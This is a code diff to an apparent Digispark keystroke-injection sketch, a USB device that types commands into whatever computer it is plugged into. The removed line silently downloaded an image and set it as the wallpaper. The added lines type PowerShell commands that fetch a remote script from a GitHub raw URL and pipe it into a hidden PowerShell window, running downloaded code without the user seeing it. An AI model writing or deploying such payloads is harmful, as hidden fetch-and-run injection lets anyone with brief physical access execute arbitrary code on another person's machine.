@@ -12,11 +12,14 @@ void setup() {
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(50);
-  DigiKeyboard.print("PowerShell.exe -windowstyle hidden Invoke-WebRequest http://www.thecuriosityworkshop.com/wp-content/uploads/2015/03/01-rubberduck-hongkong.jpg -OutFile C:\\temp\\d.jpg;set-itemproperty -path 'HKCU:\\Control Panel\\Desktop\\' -name wallpaper -value 'C:\\temp\\d.jpg' -Force;sleep 5;RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True");
+  DigiKeyboard.print("$Response = Invoke-WebRequest https://raw.githubusercontent.com/vmorganp/digispark/master/wallpaper_changer/remote_script.ps1");
+  DigiKeyboard.delay(50);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(50);
+  DigiKeyboard.print("echo $Response.Content | PowerShell.exe -windowstyle hidden");
   DigiKeyboard.delay(50);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 }
 
 void loop() {
-  // nothing needs to run here
 }
